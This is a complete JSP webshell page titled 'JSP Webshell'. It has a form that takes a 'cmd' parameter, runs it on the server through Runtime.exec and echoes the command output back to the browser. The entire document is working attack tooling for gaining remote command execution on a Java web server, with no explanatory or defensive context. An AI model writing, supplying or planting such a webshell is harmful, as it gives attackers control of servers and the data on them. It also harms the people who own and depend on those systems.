<%@ page import="java.util.*,java.io.*"%>
<html>
<head>
    <title>JSP Webshell</title>
</head>
<body>
    <form method="POST" name="myform" action="">
        <input type="text" name="cmd">
        <input type="submit" value="Execute">
    </form>
    <pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<br>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        out.println("<cmd_output>");
        while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
                }
        }
        out.println("</cmd_output>");
%>
    </pre>
</body>
</html>
